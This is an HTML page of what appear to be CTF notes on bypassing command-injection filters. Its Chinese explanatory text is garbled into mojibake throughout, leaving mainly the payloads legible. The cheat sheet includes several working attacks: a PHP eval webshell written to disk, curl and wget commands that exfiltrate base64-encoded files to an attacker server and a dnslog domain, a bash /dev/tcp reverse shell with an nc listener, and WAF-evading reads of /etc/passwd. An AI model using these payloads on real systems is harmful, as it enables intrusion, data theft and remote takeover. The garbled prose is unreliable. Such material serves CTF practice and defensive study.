<h2 id="ÁªïËøáÊäÄÂ∑ß"><a class="markdownIt-Anchor" href="#ÁªïËøáÊäÄÂ∑ß"></a> ÁªïËøáÊäÄÂ∑ß</h2>
<h3 id="Á©∫Ê†ºËøáÊª§"><a class="markdownIt-Anchor" href="#Á©∫Ê†ºËøáÊª§"></a> Á©∫Ê†ºËøáÊª§</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span> „ÄÅeg:cat<span class="token operator">&lt;</span>/flag
<span class="token operator">&lt;></span>„ÄÅ
%09<span class="token punctuation">(</span>tabÈîÆ<span class="token punctuation">)</span>„ÄÅ
%20<span class="token punctuation">(</span>urlÁºñÁ†Å‰∏≠ÁöÑÁ©∫Ê†ºÁ¨¶<span class="token punctuation">)</span>„ÄÅ
<span class="token environment constant">$IFS</span><span class="token variable">$9</span>„ÄÅ<span class="token punctuation">(</span><span class="token environment constant">$IFS</span>ÊòØshellËÑöÊú¨ÁöÑÂÜÖÈÉ®Â≠óÊÆµÂàÜÂâ≤Á¨¶ÂèØ‰ª•‰ª£Ë°®Á©∫Ê†º<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$9</span>ÊòØÂΩìÂâçÁ≥ªÁªüshellËøõÁ®ãÁöÑÁ¨¨‰πù‰∏™ÂèÇÊï∞ÁöÑÊåÅÊúâËÄÖÔºåÂÆÉÂßãÁªà‰∏∫Á©∫Â≠óÁ¨¶‰∏≤<span class="token punctuation">)</span>
<span class="token environment constant">$IFS</span><span class="token variable">$1</span>„ÄÅeg:ls<span class="token environment constant">$IFS</span><span class="token variable">$1</span>-a
<span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>„ÄÅ
<span class="token environment constant">$IFS</span>Á≠âÔºåËøòÂèØ‰ª•Áî®<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> ÊØîÂ¶Ç <span class="token punctuation">&#123;</span>cat,flag<span class="token punctuation">&#125;</span>
cat<span class="token operator">&lt;></span>flag.txt
<span class="token assign-left variable">kg</span><span class="token operator">=</span><span class="token string">$'<span class="token entity" title="\x20">\x20</span>flag.txt'</span><span class="token operator">&amp;&amp;</span><span class="token function">cat</span><span class="token variable">$kg</span>
<span class="token punctuation">(</span><span class="token punctuation">\</span>x20ËΩ¨Êç¢ÊàêÂ≠óÁ¨¶‰∏≤Â∞±ÊòØÁ©∫Ê†ºÔºåËøôÈáåÈÄöËøáÂèòÈáèÁöÑÊñπÂºèÂ∑ßÂ¶ôÁªïËøá<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="ÂÖ≥ÈîÆÂ≠óËøáÊª§"><a class="markdownIt-Anchor" href="#ÂÖ≥ÈîÆÂ≠óËøáÊª§"></a> ÂÖ≥ÈîÆÂ≠óËøáÊª§</h3>
<p>‰æãÂ¶ÇËøáÊª§‰∫Ü<code>cat</code>‰∏é<code>flag</code>Á≠âÂÖ≥ÈîÆËØç</p>
<h4 id="‰ª£Êõø"><a class="markdownIt-Anchor" href="#‰ª£Êõø"></a> ‰ª£Êõø</h4>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">more:‰∏ÄÈ°µ‰∏ÄÈ°µÁöÑÊòæÁ§∫Ê°£Ê°àÂÜÖÂÆπ
less:‰∏é <span class="token function">more</span> Á±ª‰ºº
head:Êü•ÁúãÂ§¥Âá†Ë°å
tac:‰ªéÊúÄÂêé‰∏ÄË°åÂºÄÂßãÊòæÁ§∫ÔºåÂèØ‰ª•ÁúãÂá∫ <span class="token function">tac</span> ÊòØ <span class="token function">cat</span> ÁöÑÂèçÂêëÊòæÁ§∫
tail:Êü•ÁúãÂ∞æÂá†Ë°å
nlÔºöÊòæÁ§∫ÁöÑÊó∂ÂÄôÔºåÈ°∫‰æøËæìÂá∫Ë°åÂè∑
od:‰ª•‰∫åËøõÂà∂ÁöÑÊñπÂºèËØªÂèñÊ°£Ê°àÂÜÖÂÆπ
vi:‰∏ÄÁßçÁºñËæëÂô®ÔºåËøô‰∏™‰πüÂèØ‰ª•Êü•Áúã
vim:‰∏ÄÁßçÁºñËæëÂô®ÔºåËøô‰∏™‰πüÂèØ‰ª•Êü•Áúã
sort:ÂèØ‰ª•Êü•Áúã
<span class="token function">uniq</span> -c:ÂèØ‰ª•Êü•Áúã
<span class="token function">file</span> -f:Êä•ÈîôÂá∫ÂÖ∑‰ΩìÂÜÖÂÆπ
<span class="token function">sh</span> /flag <span class="token operator"><span class="token file-descriptor important">2</span>></span>%261<span class="token punctuation">(</span>%261urlËß£Á†ÅÂç≥ÊòØ<span class="token operator">&amp;</span><span class="token punctuation">)</span>  //Êä•ÈîôÂá∫Êñá‰ª∂ÂÜÖÂÆπ
<span class="token function">bash</span> <span class="token parameter variable">-v</span> <span class="token function">file</span>
<span class="token function">rev</span>
strings
<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="ËΩ¨‰πâÁ¨¶"><a class="markdownIt-Anchor" href="#ËΩ¨‰πâÁ¨¶"></a> ËΩ¨‰πâÁ¨¶</h4>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>c<span class="token punctuation">\</span>a<span class="token punctuation">\</span>t /f<span class="token punctuation">\</span>l<span class="token punctuation">\</span>a<span class="token punctuation">\</span>g
<span class="token function">cat</span> fl<span class="token string">''</span>ag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="ÂÜÖËÅî"><a class="markdownIt-Anchor" href="#ÂÜÖËÅî"></a> ÂÜÖËÅî</h4>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">a</span><span class="token operator">=</span>fl<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>ag.php<span class="token punctuation">;</span><span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$a</span><span class="token variable">$b</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ÔºàÂÅáËÆæËØ•ÁõÆÂΩï‰∏ãÊúâindex.phpÂíåflag.phpÔºâ
<span class="token function">cat</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span><span class="token variable">`</span></span> 
Á≠âÂêå‰∫é--<span class="token operator">></span>
<span class="token function">cat</span> flag.php<span class="token punctuation">;</span><span class="token function">cat</span> index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="ÁºñÁ†ÅËøõÂà∂ÁªïËøá"><a class="markdownIt-Anchor" href="#ÁºñÁ†ÅËøõÂà∂ÁªïËøá"></a> ÁºñÁ†ÅËøõÂà∂ÁªïËøá</h4>
<ol>
<li>base64</li>
<li>16ËøõÂà∂</li>
<li>8ËøõÂà∂</li>
<li>urlÁºñÁ†Å</li>
</ol>
<h4 id="ËøáÊª§Êñá‰ª∂ÂêçÁªïËøá"><a class="markdownIt-Anchor" href="#ËøáÊª§Êñá‰ª∂ÂêçÁªïËøá"></a> ËøáÊª§Êñá‰ª∂ÂêçÁªïËøá</h4>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span><span class="token punctuation">)</span> Âà©Áî®Ê≠£ÂàôÂåπÈÖçÁªïËøá

<span class="token punctuation">[</span>root~<span class="token punctuation">]</span><span class="token comment"># cat /???/pass* //?ÂåπÈÖç‰ªª‰∏ÄÂ≠óÁ¨¶</span>

<span class="token number">2</span><span class="token punctuation">)</span> ‰æãÂ¶ÇËøáÊª§/etc/passwd‰∏≠ÁöÑetcÔºåÂà©Áî®Êú™ÂàùÂßãÂåñÂèòÈáèÔºå‰ΩøÁî®<span class="token variable">$u</span>ÁªïËøá

<span class="token punctuation">[</span>root~<span class="token punctuation">]</span><span class="token comment"># cat /etc$u/passwd</span>

Â§áÊ≥®ÔºöÊ≠§ÊñπÊ≥ïËÉΩÁªïCloudFlare WAFÔºàÂá∫Ëá™Ôºöhttps://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/Ôºâ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="systemÁªïËøá"><a class="markdownIt-Anchor" href="#systemÁªïËøá"></a> system()ÁªïËøá</h4>
<ol>
<li>
<p><code>‚Äú\x73\x79\x73\x74\x65\x6d‚Äù(‚Äúcat%20/flag‚Äù);</code></p>
<p>‰ΩøÁî®‰∫ÜËøõÂà∂ËΩ¨Êç¢‰ª£Êõø‰∫Ü<code>system</code></p>
</li>
<li>
<p><code>(sy.(st).em)(whoami);</code></p>
<p><code>.</code>Â≠óÁ¨¶ÊãºÊé•ÔºåÊã¨Âè∑‰∏çÂΩ±Âìç</p>
</li>
<li>
<p>‰ΩøÁî®ÂÜÖËÅîÊâßË°å</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span><span class="token variable">`</span></span><span class="token punctuation">;</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span><span class="token variable">)</span></span><span class="token punctuation">;</span>
?<span class="token operator">></span><span class="token operator">&lt;</span>?<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span><span class="token variable">`</span></span><span class="token punctuation">;</span>
?<span class="token operator">></span><span class="token operator">&lt;</span>?<span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span><span class="token variable">)</span></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h4 id="ÁâπÊÆäÂèòÈáè"><a class="markdownIt-Anchor" href="#ÁâπÊÆäÂèòÈáè"></a> ÁâπÊÆäÂèòÈáè</h4>
<p>Âú®Ê≤°Êúâ‰º†ÂèÇÁöÑÊÉÖÂÜµ‰∏ãÔºåÊúâ‰∫õÁâπÊÆäÂèòÈáèÈÉΩÊòØÁ©∫ÁöÑ</p>
<p><code>$*</code>‰∏é<code>$@</code></p>
<p><code>$x</code>‰∏é<code>$&#123;x&#125;</code></p>
<p>ËøòÊúâÂæàÂ§öÂÖ∂‰ªñÁöÑÁâπÊÆäÂèòÈáèÂèØ‰ª•ÊµãËØï</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ca<span class="token variable">$*</span>t flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="ËøáÊª§"><a class="markdownIt-Anchor" href="#ËøáÊª§"></a> ËøáÊª§<code>/</code></h3>
<p>ÈááÁî®Â§ö‰∏™ÁÆ°ÈÅìÂëΩ‰ª§Âç≥ÂèØ</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span><span class="token builtin class-name">cd</span> flag_is_here<span class="token punctuation">;</span><span class="token function">cat</span> *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="ËøáÊª§ÂàÜÈöîÁ¨¶"><a class="markdownIt-Anchor" href="#ËøáÊª§ÂàÜÈöîÁ¨¶"></a> ËøáÊª§ÂàÜÈöîÁ¨¶<code>|&amp;</code></h3>
<ol>
<li>‰ΩøÁî®<code>%0a</code>‰ª£Êõø</li>
</ol>
<table>
<thead>
<tr>
<th>ÂäüËÉΩ</th>
<th>Á¨¶Âè∑</th>
<th>payload</th>
</tr>
</thead>
<tbody>
<tr>
<td>Êç¢Ë°åÁ¨¶</td>
<td>%0a</td>
<td>?cmd=123%0als</td>
</tr>
<tr>
<td>ÂõûËΩ¶Á¨¶</td>
<td>%0d</td>
<td>?cmd=123%0dls</td>
</tr>
<tr>
<td>ËøûÁª≠Êåá‰ª§</td>
<td>;</td>
<td>?1=123;pwd</td>
</tr>
<tr>
<td>ÂêéÂè∞ËøõÁ®ã</td>
<td>&amp;</td>
<td>?1=123&amp;pwd</td>
</tr>
<tr>
<td>ÁÆ°ÈÅì</td>
<td>|</td>
<td>?1=123|pwd</td>
</tr>
<tr>
<td>ÈÄªËæëËøêÁÆó</td>
<td>||Êàñ&amp;&amp;</td>
<td>?1=123&amp;&amp;pwd</td>
</tr>
</tbody>
</table>
<ol start="2">
<li>
<p><code>?&gt;</code>‰ª£Êõø<code>;</code></p>
<p>Âú®<code>php</code>‰∏≠Áî®<code>?&gt;</code>Êù•‰ª£ÊõøÊúÄÂêé‰∏Ä‰∏™<code>;</code></p>
<p>ÂéüÂõ†ÊòØphpÈÅáÂà∞ÂÆöÁïåÁ¨¶ÂÖ≥Èó≠Ê†áÂøóÊó∂ÔºåÁ≥ªÁªü‰ºöËá™Âä®Âú®PHPËØ≠Âè•‰πãÂêéÂä†‰∏ä‰∏Ä‰∏™<code>;</code></p>
</li>
</ol>
<h3 id="ÈïøÂ∫¶ÈôêÂà∂"><a class="markdownIt-Anchor" href="#ÈïøÂ∫¶ÈôêÂà∂"></a> ÈïøÂ∫¶ÈôêÂà∂*</h3>
<p><a target="_blank" rel="noopener" href="https://speakerdeck.com/player/f81159300925466c88335f3cf740beb6">Â∞èÂØÜÂúàÈáåÁöÑÈÇ£‰∫õÂ•áÊäÄÊ∑´Â∑ß - Speaker Deck</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87203">„ÄêCTF ÊîªÁï•„ÄëÂ¶Ç‰ΩïÁªïËøáÂõõ‰∏™Â≠óÁ¨¶ÈôêÂà∂getshell-ÂÆâÂÖ®ÂÆ¢ - ÂÆâÂÖ®ËµÑËÆØÂπ≥Âè∞ (anquanke.com)</a></p>
<p>Ê†∏ÂøÉÊÄùÊÉ≥Â∞±ÊòØ:Âà©Áî®Êñá‰ª∂ÂêçËøõË°åÂëΩ‰ª§ÊãºÊé•ÔºåÁÑ∂ÂêéÂà©Áî®<code>ls -t &gt;a</code>ÂèØ‰ª•Â∞ÜÂêéÈó®ÂëΩ‰ª§ÂÜôÂÖ•‰∏Ä‰∏™Êñá‰ª∂ÔºåÁÑ∂ÂêéÂà©Áî®<code>sh a</code>ËøõË°åÊâßË°å</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~/Ê°åÈù¢<span class="token comment"># echo "flag&#123;hahaha&#125;" > flag.txt</span>
root@kali:~/Ê°åÈù¢<span class="token comment"># touch "ag"</span>
root@kali:~/Ê°åÈù¢<span class="token comment"># touch "fl\\"</span>
root@kali:~/Ê°åÈù¢<span class="token comment"># touch "t \\"</span>
root@kali:~/Ê°åÈù¢<span class="token comment"># touch "ca\\"</span>
root@kali:~/Ê°åÈù¢<span class="token comment"># ls -t</span>
<span class="token string">'ca\'</span>  <span class="token string">'t \'</span>  <span class="token string">'fl\'</span>   ag   flag
root@kali:~/Ê°åÈù¢<span class="token comment"># ls -t >a     #Â∞Ü ls -t ÂÜÖÂÆπÂÜôÂÖ•Âà∞aÊñá‰ª∂‰∏≠</span>
root@kali:~/Ê°åÈù¢<span class="token comment"># sh a</span>
a: <span class="token number">1</span>: a: not found
flag<span class="token punctuation">&#123;</span>hahaha<span class="token punctuation">&#125;</span>
a: <span class="token number">6</span>: flag.txt: not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Êó†ÂõûÊòæ"><a class="markdownIt-Anchor" href="#Êó†ÂõûÊòæ"></a> Êó†ÂõûÊòæ</h3>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43625917/article/details/107873787">ÊµÖË∞àPHPÊó†ÂõûÊòæÂëΩ‰ª§ÊâßË°åÁöÑÂà©Áî®_ÊâßË°åÊó†ÂõûÊòæ-CSDNÂçöÂÆ¢</a></p>
<h4 id="shell_execÁ≠âÊó†ÂõûÊòæÂáΩÊï∞"><a class="markdownIt-Anchor" href="#shell_execÁ≠âÊó†ÂõûÊòæÂáΩÊï∞"></a> shell_execÁ≠âÊó†ÂõûÊòæÂáΩÊï∞</h4>
<ul>
<li>
<p>Âà§Êñ≠Ôºö</p>
<p><code>ls;sleep(3)</code></p>
</li>
<li>
<p>Âà©Áî®</p>
<ol>
<li>
<p>Â§çÂà∂ÔºåÂéãÁº©ÔºåÂÜôwebshellÁ≠âÊñπÊ≥ï</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">copy flag.php <span class="token number">1</span>.txt
<span class="token function">mv</span> flag.php flag.txt
<span class="token function">cat</span> flag.php <span class="token operator">></span> flag.txt
<span class="token function">tar</span> cvf flag.tar flag.php
<span class="token function">tar</span> zcvf flag.tar.gz flag.php
<span class="token builtin class-name">echo</span> 3c3f706870206576616c28245f504f53545b3132335d293b203f3e<span class="token operator">|</span>xxd <span class="token parameter variable">-r</span> <span class="token parameter variable">-ps</span> <span class="token operator">></span> webshell.php
<span class="token builtin class-name">echo</span> <span class="token string">"&lt;?php @eval(\<span class="token variable">$_POST</span>[123]); ?>"</span> <span class="token operator">></span> webshell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ÁÑ∂ÂêéËÆøÈóÆÂØπÂ∫îÁîüÊàêÁöÑÊñá‰ª∂,‰∏ãËΩΩ‰∏ãÊù•</p>
</li>
<li>
<p>Âú®vps‰∏äÂª∫Á´ãËÆ∞ÂΩïËÑöÊú¨</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$data</span><span class="token operator">=</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$f</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Âú®ÁõÆÊ†áÊúçÂä°Âô®ÁöÑÊµãËØïÁÇπÈíüÂèëÈÄÅ‰∏ãÈù¢ËØ∑Ê±ÇËøõË°åÊµãËØï</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://*.*.*.**/record.php?data<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> flag.php<span class="token operator">|</span>base64<span class="token variable">`</span></span>
<span class="token function">wget</span> http://*.*.*.*/record.php?data<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> flag.php<span class="token operator">|</span>base64<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>ÈÄöËøá<code>http``/DNS</code>ËØ∑Ê±ÇÁ≠âÊñπÂºèÂ∏¶Âá∫Êï∞ÊçÆ</p>
<blockquote>
<p>ÂéüÁêÜ:Â¶ÇÊûúËØ∑Ê±ÇÁöÑÁõÆÊ†á‰∏çÊòØipÂú∞ÂùÄËÄåÊòØÂüüÂêçÔºåÈÇ£‰πàÂüüÂêçÊúÄÁªàËøòË¶ÅËΩ¨ÂåñÊàêipÂú∞ÂùÄÔºåÂ∞±ËÇØÂÆöË¶ÅÂÅö‰∏ÄÊ¨°ÂüüÂêçËß£ÊûêËØ∑Ê±Ç„ÄÇÈÇ£‰πàÂÅáËÆæÊàëÊúâ‰∏™ÂèØÊéßÁöÑ‰∫åÁ∫ßÂüüÂêçÔºåÈÇ£‰πàÂÆÉÂèëÂá∫‰∏âÁ∫ßÂüüÂêçËß£ÊûêÁöÑÊó∂ÂÄôÔºåÊàëËøôËæπÊòØËÉΩÂ§üÊãøÂà∞ÂÆÉÁöÑÂüüÂêçËß£ÊûêËØ∑Ê±ÇÁöÑÔºåËøôÂ∞±Áõ∏ÂΩì‰∫éÂèØ‰ª•ÈÖçÂêàDNSËØ∑Ê±ÇËøõË°åÂëΩ‰ª§ÊâßË°åÁöÑÂà§Êñ≠ÔºåËøô‰∏ÄËà¨Â∞±Ë¢´Áß∞‰∏∫dnslog„ÄÇÔºàË¶ÅÈÄöËøádnsËØ∑Ê±ÇÂç≥ÂèØÈÄöËøápingÂëΩ‰ª§Ôºå‰πüËÉΩÈÄöËøácurlÂëΩ‰ª§ÔºåÂè™Ë¶ÅÂØπÂüüÂêçËøõË°åËÆøÈóÆÔºåËÆ©ÂüüÂêçÊúçÂä°Âô®ËøõË°åÂüüÂêçËß£ÊûêÂ∞±ÂèØÂÆûÁé∞Ôºâ</p>
</blockquote>
<ul>
<li>
<p>Âà©Áî®</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token variable"><span class="token variable">`</span>ÂëΩ‰ª§<span class="token variable">`</span></span>.ÂüüÂêç<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<pre class="highlight"><code class="bash"><span class="hljs-comment">#Áî®&lt;ÊõøÊç¢ËØªÂèñÊñá‰ª∂‰∏≠ÁöÑÁ©∫Ê†ºÔºå‰∏îÂØπËæìÂá∫ÁªìÊûúbase64ÁºñÁ†Å</span>
curl `<span class="hljs-built_in">cat</span>&lt;flag.php|<span class="hljs-built_in">base64</span>`

<span class="hljs-comment">#ÊãºÊé•ÂüüÂêç(ÊúÄÁªàÊûÑÈÄ†ÁªìÊûú)</span>
curl `<span class="hljs-built_in">cat</span>&lt;flag.php|<span class="hljs-built_in">base64</span>`.v4utm7.ceye.io
<span class="hljs-comment">#Âè¶‰∏ÄÁßçÊñπÊ≥ï(‰∏çËøáÊúâÁöÑÁéØÂ¢É‰∏ã‰∏çÂèØ‰ª•)`cat flag.php|sed s/[[:space:]]//g`.v4utm7.ceye.io</span>

<pre class="line-numbers language-none"><code class="language-none">
4. ‰ΩøÁî®&#96;linux tee&#96;Êã¶Êà™ËæìÂá∫

   &#96;&#96;&#96;bash
   tee file1 file2
   ls &#x2F;|tee 1.txt&#x2F;&#x2F;Â∞ÜlsÁöÑÂëΩ‰ª§ËæìÂá∫Â§çÂà∂Âà∞1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</code></pre>
</li>
</ul>
</li>
<li>
<p>ÂèçÂºπshell</p>
<p>[<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">~]#Ê£±Ëßí ::Edge.Forum* (ywhack.com)</a></p>
<ul>
<li>
<p>Âà©Áî®Êù°‰ª∂:ÁõÆÊ†áÊúçÂä°Âô®ÂèØ‰ª•ÂêëÂèØÈÄö‰ø°ÁöÑÂÖ¨ÁΩëÊúçÂä°Âô®ÂèëËµ∑httpËØ∑Ê±Ç</p>
</li>
<li>
<p>ÊúçÂä°Âô®Á´ØÊâßË°å</p>
<p><code>nc -lvp 8888</code></p>
<p>ÂëΩ‰ª§ÊâßË°åÂ§ÑÊâßË°å</p>
<p><code>bash -i &gt;&amp; /dev/tcp/your_ip/8888 0&gt;&amp;1</code></p>
<p>‰πüÂ∞±ÊòØÊääÊ†áÂáÜËæìÂá∫ÊµÅÂèëÈÄÅÂà∞Ëá™Â∑±ÁöÑÊúçÂä°Âô®‰∏ä</p>
<p><code>0&gt;&amp;1</code>ÂàôË°®Á§∫bashshellÁöÑÊ†áÂáÜËæìÂÖ•‰πüÊù•Ëá™ËØ•ÁΩëÁªúËøûÊé•</p>
</li>
</ul>
</li>
</ol>
</li>
</ul>
<h4 id="devnull-21Á±ªÊó†ÂõûÊòæ"><a class="markdownIt-Anchor" href="#devnull-21Á±ªÊó†ÂõûÊòæ"></a> &gt;/dev/null 2&gt;&amp;1Á±ªÊó†ÂõûÊòæ</h4>
<p><code>&gt;/dev/null 2&gt;&amp;1</code>Â∞ÜÊ†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÊµÅÈÉΩÊ∏ÖÁ©∫</p>
<p>ÊÄùË∑ØÊòØÁõ¥Êé•Âú®ËØ•ÂëΩ‰ª§‰πãÂâçËøõË°åÂàÜÈöîÔºå‰Ωø‰πãÊó†Êïà</p>
<h3 id="perl‰∏≠ÁöÑopenÂëΩ‰ª§ÊâßË°å"><a class="markdownIt-Anchor" href="#perl‰∏≠ÁöÑopenÂëΩ‰ª§ÊâßË°å"></a> Perl‰∏≠ÁöÑopenÂëΩ‰ª§ÊâßË°å</h3>
<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/107720578">HITCON 2017]SSRFmeÔºàPerl‰∏≠GETÂëΩ‰ª§ÊâßË°åÔºâ_perlÂíågetÁöÑÂÖ≥Á≥ª-CSDNÂçöÂÆ¢</a></p>
<p>Ê†∏ÂøÉÁÇπÂ∞±ÊòØ:</p>
<p><code>$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</code></p>
<p><code>GET</code>Â∫ïÂ±ÇÂÆûÁé∞ÂÆûÁé∞ÁöÑÊòØ<code>open</code>ÂáΩÊï∞ÔºåËÄå<code>open</code>ÂáΩÊï∞ÂèØ‰ª•ÊâßË°åÂëΩ‰ª§</p>
<h3 id="Êó†Êï∞Â≠óÂ≠óÊØçwebshell"><a class="markdownIt-Anchor" href="#Êó†Êï∞Â≠óÂ≠óÊØçwebshell"></a> Êó†Êï∞Â≠óÂ≠óÊØçwebshell*</h3>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8107?time__1311=n4%2BxuDgDBDyGD%3DDOFD%2FD0ioQ4%2BPsFD9CAeoD&amp;alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%3A%2F%2Fxz.aliyun.com%2Ft%2F8107">Êó†Â≠óÊØçÊï∞Â≠ówebshellÊÄªÁªì - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">Êó†Â≠óÊØçÊï∞Â≠óÁªïËøáÊ≠£ÂàôË°®ËææÂºèÊÄªÁªìÔºàÂê´‰∏ä‰º†‰∏¥Êó∂Êñá‰ª∂„ÄÅÂºÇÊàñ„ÄÅÊàñ„ÄÅÂèñÂèç„ÄÅËá™Â¢ûËÑöÊú¨Ôºâ-CSDNÂçöÂÆ¢</a></p>
<h3 id="ËøáÊª§Êã¨Âè∑"><a class="markdownIt-Anchor" href="#ËøáÊª§Êã¨Âè∑"></a> ËøáÊª§Êã¨Âè∑</h3>
<ol>
<li>
<p>‰ΩøÁî®‰∏çÈúÄË¶ÅÊã¨Âè∑ÁöÑÂáΩÊï∞</p>
<ul>
<li>
<p>echo</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`cat /flag`</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>require</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">require</span> <span class="token string backtick-quoted-string">`/flag`</span>
<span class="token keyword">include</span><span class="token operator">%</span><span class="token number">09</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
</ul>
</li>
<li>
<p>‰∏çÈúÄË¶ÅÂºïÂè∑ÂíåÁ©∫Ê†º</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">#<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">require</span><span class="token operator">~</span><span class="token operator">~</span>flag<span class="token operator">.</span>txt<span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">require</span><span class="token operator">~</span><span class="token operator">%</span>d0<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">9</span>e<span class="token operator">%</span><span class="token number">98</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
</ol>
<h3 id="Êó†ÂèÇÊï∞rce"><a class="markdownIt-Anchor" href="#Êó†ÂèÇÊï∞rce"></a> Êó†ÂèÇÊï∞RCE*</h3>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76690905/article/details/133808536">Êó†ÂèÇÊï∞RCEÁªïËøáÁöÑËØ¶ÁªÜÊÄªÁªìÔºàÂÖ≠ÁßçÊñπÊ≥ïÔºâ_Êó†ÂèÇÊï∞ÁöÑÂèñÂèçrce-CSDNÂçöÂÆ¢</a></p>
